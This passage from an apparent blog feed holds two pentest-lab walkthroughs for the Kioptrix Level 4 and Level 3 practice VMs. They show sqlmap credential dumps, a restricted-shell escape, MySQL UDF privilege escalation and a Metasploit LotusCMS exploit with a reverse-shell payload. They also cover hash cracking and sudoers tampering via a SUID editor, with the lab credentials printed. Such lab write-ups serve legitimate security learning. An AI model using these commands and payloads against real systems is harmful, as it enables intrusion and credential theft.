|<em>nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|</em>  System time: 2014-06-22T18:36:57-04:00
| smb-security-mode:
|   Account that was used for smb scripts: guest
|   User-level authentication
|   SMB Security: Challenge/response passwords supported
|<em>  Message signing disabled (dangerous, but default)
|</em>smbv2-enabled: Server doesn&rsquo;t support SMBv2 protocol
```</p>

<p>Again, this seems to be a web based challenge. Navigating to the target website shows this:</p>

<p><img class="center" src="/images/kio4.png" title="&lsquo;login&rsquo; &lsquo;login&rsquo;" ></p>

<p>Supplying a single quote in the password field gives an error, which nicely discloses the database end as being MySQL:</p>

<p><em>Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28
Wrong Username or Password</em></p>

<p>Sqlmap to the rescue!</p>

<p>``` plain
sqlmap -u &ldquo;<a href="http://192.168.127.129/checklogin.php">http://192.168.127.129/checklogin.php</a>&rdquo; &mdash;dbms=MySQL &mdash;level=5 &mdash;risk=3 &mdash;data=&ldquo;myusername=admin&amp;mypassword=test&rdquo; &mdash;dump</p>

<p>Database: members
Table: members
[2 entries]
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| id | username | password              |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| 1  | john     | MyNameIsJohn          |
| 2  | robert   | ADGAdsafdfwt4gadfga== |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
```</p>

<p>Logging in with these credentials didn&rsquo;t yield anything though, all I could see was a member&rsquo;s control panel with no functionality. So I remembered the previous challenge that allowed SSH access, and tried to log in:</p>

<p><code>plain
root@kali:~# ssh john@192.168.127.129
The authenticity of host '192.168.127.129 (192.168.127.129)' can't be established.
RSA key fingerprint is 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.127.129' (RSA) to the list of known hosts.
john@192.168.127.129's password:
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$
</code></p>

<p>Excellent! It&rsquo;s time for some sniffing around. This is not a normal shell, usual commands don&rsquo;t work, so let&rsquo;s see what&rsquo;s available with the help system.</p>

<p><code>plain
john:~$ help
cd  clear  echo  exit  help  ll  lpath  ls
</code></p>

<p>Hmm, not much. Actions are restricted too, can&rsquo;t <em>cd</em> to wherever I want:</p>

<p><code>plain
john:~$ cd /
*** forbidden path -&gt; "/"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
</code></p>

<p>So I googled for a bit, and it appears this shell is a Python based limited shell (<a href="https://github.com/ghantoos/lshell">https://github.com/ghantoos/lshell</a>):</p>

<blockquote><p>lshell is a shell coded in Python, that lets you restrict a user&rsquo;s environment to limited sets of commands, choose to enable/
disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user&rsquo;s commands, implement timing restriction, and more.</p></blockquote>

<p>It is possible to escape from this shell by leveraging the <em>echo</em> command to call <em>os.system</em> in order to spawn a shell: <code>echo os.system(&lsquo;/bin/bash&rsquo;)</code></p>

<p><code>plain
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
</code></p>

<p>Poking around, I found the following information in <code>/var/www/john/john.php</code>:</p>

<p><code>plain
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
</code></p>

<p>So, root doesn&rsquo;t have a password for MySQL? Let&rsquo;s check:</p>

<p>``` plain
john@Kioptrix4:/var/www/john$ mysql -u root -h localhost
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</p>

<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the buffer.
```</p>

<p><a href="http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/">Here</a> I have found a way to get root privileges from a MySQL server running as root. Here&rsquo;s a quick summary:</p>

<ul>
<li><p>It is possible to escalate from MySQL server root level to system root by using User Defined Functions (UDF)</p></li>
<li><p>We need the <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys.so</a> library that contains some useful functions that can interact with the OS. The most important ones are <strong>sys_exec</strong> (executes the command and returns the exit status) and <strong>sys_eval</strong> (executes the command and returns the standard output)</p></li>
</ul>


<p>The next step would be to find a way to get the library on the machine with our MySQL server. But that&rsquo;s not necessary in this case, because it&rsquo;s already on the server!</p>

<p><code>plain
john@Kioptrix4:~$ whereis lib_mysqludf_sys.so
lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so
</code></p>

<p>It took a bit of googling and trial and error until I found a way that worked in getting me to a root shell. <a href="http://superuser.com/questions/400723/how-do-i-create-a-superuser-from-the-command-line-in-ubuntu">Here</a> is a useful post. The relevant part for us is this:</p>

<blockquote><p>Until Ubuntu 11.10, the Unix group for administrators with root privileges through sudo had been admin. Starting with Ubuntu
12.04  LTS, it is now sudo, for compatibility with Debian and sudo itself. However, for backwards compatibility, admin group
members are still recognized as administrators</p></blockquote>

<p>So it is possible to make the john account to be part of the admin group, that is equivalent to the sudo group. So from the MySQL prompt, run this:</p>

<p><code>sql
SELECT sys_exec('usermod -a -G admin');
</code></p>

<p>What that does is it modifies john&rsquo;s account, appending it to the admin group. So let&rsquo;s do it on the MySQL command line:</p>

<p><code>sql
mysql&gt; select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 |
+--------------------------------------+
1 row in set (0.11 sec)
</code></p>

<p>Now from john&rsquo;s shell:</p>

<p><code>plain
john@Kioptrix4:~$ sudo su
[sudo] password for john:
root@Kioptrix4:/home/john# whoami
root
</code></p>

<p>Awesome! We finally got root access! In root&rsquo;s directory there is another </code>congrats.txt</code> file that tells us there are at least 2 different tested ways to get root on this system. It sure was an interesting machine, and my favorite in the series, because it wasn&rsquo;t as straightforward as the others, and I had to look for more information and try (and fail) different approaches before I hit upon the winning one.</p>

<p>Here&rsquo;s today&rsquo;s fortune cookie:</p>

<blockquote><p>You single-handedly fought your way into this hopeless mess.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 3]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3/"/>
    <updated>2014-06-20T23:53:34+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3</id>
    <content type="html"><![CDATA[<p>Next in the Kioptrix series is level 3.</p>

<p><strong>Important</strong></p>

<p>With the VM there is a README.txt file that says you should update your hosts file with the VM&rsquo;s IP and hostname, which is <em>kioptrix3.com</em>. I initially ignored it and on the gallery page, all I could see were some broken images and links that didn&rsquo;t work. I went back and added the entry to my <code>/etc/hosts</code> file, and everything worked fine afterwards.</p>

<!-- more -->


<p>Start by checking out what&rsquo;s being exposed with Nmap:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.128</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-20 23:56 EEST
Nmap scan report for 192.168.127.128
Host is up (0.00039s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|<em>  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Ligoat Security &ndash; Got Goat? Security &hellip;
MAC Address: 00:0C:29:07:4F:A9 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 &ndash; 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```</p>

<p>Let&rsquo;s take a look at what&rsquo;s hosted on the web server. It appears to be a site with a blog page, a gallery and what appears to be an admin login page:</p>

<p><img class="center" src="/images/lotus_cms.png" title="&lsquo;admin login&rsquo; &lsquo;login&rsquo;" ></p>

<p>I tried running a sqlmap scan against it, with no success. Next, I thought maybe there might be something about the LotusCMS that powers up the site. It turns out there&rsquo;s a remote execution exploit available in Metasploit:</p>

<p><strong>LotusCMS 3.0 eval() Remote Command Execution</strong></p>

<blockquote><p>This module exploits a vulnerability found in Lotus CMS 3.0&rsquo;s Router() function. This is done by embedding PHP code in the &lsquo;page&rsquo; parameter,
which will be passed to a eval call, therefore allowing remote code execution. The module can either automatically pick up a &lsquo;page&rsquo; parameter
from the default page, or manually specify one in the URI option. To use the automatic method, please supply the URI with just a directory path,
for example: &ldquo;/lcms/&rdquo;. To manually configure one, you may do: &ldquo;/lcms/somepath/index.php?page=index&rdquo;</p></blockquote>

<p>``` plain
msf > use exploit/multi/http/lcms_php_exec
msf exploit(lcms_php_exec) > show options</p>

<p>Module options (exploit/multi/http/lcms_php_exec):</p>

<p>   Name     Current Setting  Required  Description</p>

<hr />

<p>   Proxies                   no        Use a proxy chain
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic LotusCMS 3.0</p>

<p>msf exploit(lcms_php_exec) > set RHOST 192.168.127.128
RHOST => 192.168.127.128
msf exploit(lcms_php_exec) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf exploit(lcms_php_exec) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(lcms_php_exec) > set URI /
URI => /
msf exploit(lcms_php_exec) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.127.159:4444
[</em>] Using found page param: /index.php?page=index
[<em>] Sending exploit &hellip;
[</em>] Command shell session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.128:40623) at 2014-06-22 00:37:23 +0300
whoami</p>

<p>www-data
```</p>

<p>So we have a shell. I could not find a local privilege escalation exploit right away, so I instead started exploring the system.</p>

<p><code>plain
pwd
/home/www/kioptrix3.com
ls -l
total 84
drwxrwxrwx  2 root root  4096 Apr 15  2011 cache
drwxrwxrwx  8 root root  4096 Apr 14  2011 core
drwxrwxrwx  8 root root  4096 Apr 14  2011 data
-rw-r--r--  1 root root 23126 Jun  5  2009 favicon.ico
drwxr-xr-x  7 root root  4096 Apr 14  2011 gallery
-rw-r--r--  1 root root 26430 Jan 21  2007 gnu-lgpl.txt
-rw-r--r--  1 root root   399 Feb 23  2011 index.php
drwxrwxrwx 10 root root  4096 Apr 14  2011 modules
drwxrwxrwx  3 root root  4096 Apr 14  2011 style
-rw-r--r--  1 root root   243 Aug  5  2010 update.php
</code></p>

<p>The gallery directory looks interesting, so I looked inside:</p>

<p><code>plain
cd gallery
ls -l
total 156
drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK
-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql
-rw-r--r-- 1 root root   252 Apr 12  2011 g.php
drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin
-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php
-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php
-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php
-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php
-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php
-rw-r--r-- 1 root root   249 Apr 12  2011 index.php
-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK
-rw-r--r-- 1 root root   212 Apr 12  2011 login.php
-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php
-rw-r--r-- 1 root root   249 Apr 12  2011 p.php
drwxrwxrwx 2 root root  4096 Apr 12  2011 photos
-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php
-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php
-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php
-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html
-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php
-rw-r--r-- 1 root root   215 Apr 12  2011 register.php
drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin
-rw-r--r-- 1 root root   213 Apr 12  2011 search.php
-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php
-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php
drwxr-xr-x 6 root root  4096 Apr 12  2011 themes
-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt
-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php
</code></p>

<p>So, there&rsquo;s all the source code for the gallery. I checked the files that looked interesting until I came upon a hit on the <code>gconfig.php</code> file, which contains the sort of information we need:</p>

<p>``` plain
/*</p>

<pre><code>A sample Gallarific configuration file. You should edit
the installer details below and save this file as gconfig.php
Do not modify anything else if you don't know what it is.
</code></pre>

<p>*/</p>

<pre><code>$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

$GLOBALS["gallarific_mysql_server"] = "localhost";
$GLOBALS["gallarific_mysql_database"] = "gallery";
$GLOBALS["gallarific_mysql_username"] = "root";
$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
</code></pre>

<p>```</p>

<p>I tried SSHing to the box with these credentials and also elevating privileges with su, but that would have been too easy. So more digging in the Php source code. The <code>gfunctions.php</code> file contains a plethora of information, among which there are some table and column names. There might be more information in the Php files but I didn&rsquo;t have the patience to go through all of them.</p>

<p>Back at the gallery, we can see some sorting options:</p>

<p><img class="center" src="/images/sort.png" title="&lsquo;sort options&rsquo; &lsquo;sort&rsquo;" ></p>

<p>Changing the sort filter to <em>photo id</em> makes the URL look like this:</p>

<p><code><a href="http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos">http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</a></code></p>

<p>And if I replace the <code>id=1</code> part with <code>id=&lsquo;</code>, the site spits back a SQL error:</p>

<p><em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;&rsquo; order by parentid,sort,name' at line 1Could not select category</em></p>

<p>Now that I know SQLi is possible, it&rsquo;s time to fire sqlmap again!</p>

<p>``` plain
sqlmap -u &ldquo;<a href="http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos">http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</a>&rdquo; &mdash;dbms=MySQL &mdash;level=5 &mdash;risk=3 &mdash;dump</p>

<p>Database: gallery
Table: dev_accounts
[2 entries]
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| id | username   | password                         |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>```</p>

<p>It was a bit overkill to dump so much information, but I only show here the important bits. To crack the hashes, I used the <a href="http://www.hashkiller.co.uk/">http://www.hashkiller.co.uk/</a> site:</p>

<p>dreg&rsquo;s password: Mast3r</p>

<p>loneferret&rsquo;s password: starwars</p>

<p>Thankfully, these credentials work for SSH login, so I could get rid of the Metasploit shell which kept throwing EOF errors if I didn&rsquo;t interact with it for a while.</p>

<p>``` plain
ssh <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#x6c;&#x6f;&#x6e;&#101;&#x66;&#101;&#x72;&#x72;&#x65;&#116;&#64;&#107;&#x69;&#x6f;&#112;&#x74;&#114;&#x69;&#x78;&#51;&#46;&#x63;&#111;&#x6d;">&#x6c;&#111;&#x6e;&#101;&#102;&#x65;&#x72;&#x72;&#x65;&#x74;&#64;&#107;&#x69;&#x6f;&#112;&#116;&#114;&#105;&#120;&#x33;&#x2e;&#99;&#111;&#x6d;</a>
The authenticity of host &lsquo;kioptrix3.com (192.168.127.128)&rsquo; can&rsquo;t be established.
RSA key fingerprint is 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;kioptrix3.com&rsquo; (RSA) to the list of known hosts.
<a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#108;&#111;&#110;&#101;&#x66;&#101;&#114;&#114;&#x65;&#x74;&#64;&#x6b;&#105;&#111;&#x70;&#116;&#114;&#105;&#120;&#x33;&#x2e;&#99;&#111;&#x6d;">&#108;&#x6f;&#x6e;&#101;&#102;&#x65;&#x72;&#114;&#x65;&#116;&#64;&#107;&#105;&#111;&#x70;&#x74;&#x72;&#x69;&#120;&#x33;&#x2e;&#99;&#x6f;&#x6d;</a>&rsquo;s password:
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</p>

<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>To access official Ubuntu documentation, please visit:
<a href="http://help.ubuntu.com/">http://help.ubuntu.com/</a>
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$
```</p>

<p>In the home directory there&rsquo;s a <code>CompanyPolicy.README</code> file with the following:</p>

<p>``` plain
 Hello new employee,
 It is company policy here to use our newly installed software for editing, creating and viewing files.
 Please use the command &lsquo;sudo ht&rsquo;.
 Failure to do so will result in you immediate termination.</p>

<p> DG
 CEO
```</p>

<p>So, let&rsquo;s see what this ht program is all about:</p>

<p><code>plain
loneferret@Kioptrix3:~$ whereis ht
ht: /usr/local/bin/ht
loneferret@Kioptrix3:~$ ls -l /usr/local/bin/ht
-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht
</code></p>

<p>Looks like a SUID binary! And it seems it&rsquo;s a hex editor that we can use to view and edit any file on the system!</p>

<p><img class="center" src="/images/ht.png" title="&lsquo;ht&rsquo; &lsquo;ht&rsquo;" ></p>

<p>Ok, I could crack the root password, but there&rsquo;s an easier way, by modifing the <code>/etc/sudoers</code> file. First, I had to look up some information about the ht editor. You need to use the F (function) keys for this one. With F6, I could change the mode to text, making it look less horrible. The easiest way I found to go about it was to open the <code>/etc/sudoers</code> file again, after selecting the text mode. Then I added <em>/bin/bas</em> to loneferret&rsquo;s entry:</p>

<p><img class="center" src="/images/sudo_bash.png" title="&lsquo;sudo bash&rsquo; &lsquo;sudo bash&rsquo;" ></p>

<p>Now save the file and type <em>sudo bash</em> to get the long waited for root shell. In the /root/ directory there&rsquo;s also a <code>Congrats.txt</code> file:</p>

<p>``` plain
root@Kioptrix3:/root# cat Congrats.txt
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn&rsquo;t that bad now was it.</p>

<p>Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone.
Difficulty is relative, keep that in mind.</p>

<p>The object is to learn, do some research and have a little (legal)
fun in the process.</p>

<p>I hope you enjoyed this third challenge.</p>

<p>Steven McElrea
aka loneferret
<a href="http://www.kioptrix.com">http://www.kioptrix.com</a></p>

<p>Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.</p>

<p>Main page CMS:
<a href="http://www.lotuscms.org">http://www.lotuscms.org</a></p>

<p>Gallery application:
Gallarific 2.1 &ndash; Free Version released October 10, 2009
<a href="http://www.gallarific.com">http://www.gallarific.com</a>
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
<a href="http://www.exploit-db.com/exploits/15891/">http://www.exploit-db.com/exploits/15891/</a></p>

<p>The HT Editor can be found here:
<a href="http://hte.sourceforge.net/downloads.html">http://hte.sourceforge.net/downloads.html</a>
And the vulnerable version on Exploit-DB here:
<a href="http://www.exploit-db.com/exploits/17083/">http://www.exploit-db.com/exploits/17083/</a></p>

<p>Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```</p>

<p>And this was Kioptrix level 3, with another interesting twist.</p>

<blockquote><p>Today is the tomorrow you worried about yesterday.</p></blockquote>
]]></content>
  </entry>
  
</feed>
